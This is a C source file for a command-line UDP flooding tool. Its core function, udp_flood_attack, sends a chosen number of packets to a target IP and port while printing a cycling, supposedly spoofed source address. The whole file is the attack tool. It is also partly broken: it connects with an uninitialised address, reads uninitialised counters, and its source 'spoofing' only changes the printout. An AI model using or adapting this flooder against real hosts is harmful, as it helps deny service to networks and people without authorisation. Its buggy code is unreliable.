#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#define BUFFER_SIZE 1024
#define IP_ADDRESS_LEN 20

#define SRC_ADDR "192.168.20.1"

void next_ip_addr(char *current, int offset) {
	char *loc = current + 0;
	int ips[4];

	int i = 0;

	i=0;
	char *buf = strtok(loc,".");
	ips[i++] = atoi(buf);
	while ( (buf=strtok(NULL, ".")) != NULL) {
		ips[i++] = atoi(buf);
	}

	int top=0;
	int val_check;
	for(i=3;i>=0;i--)
	{
		if(i!=3 && top==0) break;
		if(top==1) ips[i]++;

		if(top==-1) ips[i]--;

		top =0;

			if(i==3)
			{
				val_check = ips[i]+offset;
				ips[i] += offset;
			}

		if(val_check>255)
		{
			 top=1;
		}

		if(val_check<0)
		{
			top=-1;
		}
		val_check=0;

	}


	char ips_c[16];


	sprintf(ips_c, "%d.%d.%d.%d", ips[0],ips[1],ips[2],ips[3]);
	strcpy(current,ips_c);

}

void udp_flood_attack(char srcAddr[IP_ADDRESS_LEN], char dstAddr[IP_ADDRESS_LEN], int port, int count)
{
	char *buffer = (char *)malloc(BUFFER_SIZE);
	uint32_t start_addr32h, end_addr32h, cur_addr32h;
	int fd;
	struct sockaddr_in dst;

	dst.sin_port = htons(port);
	dst.sin_family = AF_INET;	//IPv4
	inet_pton(PF_INET, dstAddr, &dst.sin_addr.s_addr);	//get ipv4 address

	memset(buffer, 0, BUFFER_SIZE);
	sprintf(buffer, "Hello, This is message!\n");

	/*
	cur_addr32h = start_addr32h = ntohl(src.sin_addr.s_addr);
	end_addr32h = start_addr32h + count;
	*/

	char printSrc[40] = {0, };
	char printDst[40] = {0, };
	struct sockaddr_in src;
	src.sin_port = htons(port);
	src.sin_family = AF_INET;	//IPv4

	if((fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0) {	//get socket descriptor for udp
		fprintf(stderr, "socket error\n");
		exit(1);
	}

	if(connect(fd, (struct sockaddr *)&src, sizeof(src)) < 0){
		fprintf(stderr, "connect error\n");
		exit(1);
	}

	for(int i = 0; i < count; i++){
	
		inet_pton(PF_INET, srcAddr, &src.sin_addr.s_addr);	//set ip address

		/*
		if(bind(fd, (struct sockaddr *)&src, sizeof(src)) < 0){
			fprintf(stderr, "bind error\n");
			exit(1);
		}
		*/

		memset(printSrc, 0, sizeof(printSrc));
		memset(printDst, 0, sizeof(printDst));
		inet_ntop(PF_INET, &src.sin_addr.s_addr, printSrc, sizeof(printSrc));
		inet_ntop(PF_INET, &dst.sin_addr.s_addr, printDst, sizeof(printDst));

		printf("%s sent to: %s\n", printSrc, printDst);
		if(sendto(fd, buffer, BUFFER_SIZE, 0, (struct sockaddr *)&dst, sizeof(dst)) < 0){
			perror("sendto() error");
			//fprintf(stderr, "send to error\n");
			exit(1);
		}
		if(++cur_addr32h >= end_addr32h)
			cur_addr32h = start_addr32h;
		next_ip_addr(srcAddr, 1);	//make next ip address
	}
	close(fd);

	free(buffer);

	return;
}

int print_usage(void)
{
	printf("print usage!\n");
	return 0;
}

int main(int argc, char *argv[])
{
	char dstAddr[IP_ADDRESS_LEN] = {0, };
	char srcAddr[IP_ADDRESS_LEN] = {0, };
	int port = 0;
	int count = 0;

	int optVal;

	memset(dstAddr, 0, IP_ADDRESS_LEN);
	memset(srcAddr, 0, IP_ADDRESS_LEN);
	strcpy(srcAddr, SRC_ADDR);
	/*
	if((optVal = getopt(argc, argv, "s:d:p:c")) >= 0){
		switch(optVal){
			case 's':
				sscanf(optarg, "%s", src);
				break;
			case 'd':
				sscanf(optarg, "%d", &dst);
				break;
			case 'p':
				sscanf(optarg, "%d", &port);
				break;
			case 'c':
				sscanf(optarg, "%d", &count);
				break;
		}
	}
	*/
	sscanf(argv[1], "%s", dstAddr);
	sscanf(argv[2], "%d", &port);
	sscanf(argv[3], "%d", &count);

	if(count < 1 || port < 1 || strlen(srcAddr) < 1 || strlen(dstAddr) < 1)
		return print_usage();
	
	udp_flood_attack(srcAddr, dstAddr, port, count);

	return 0;
}
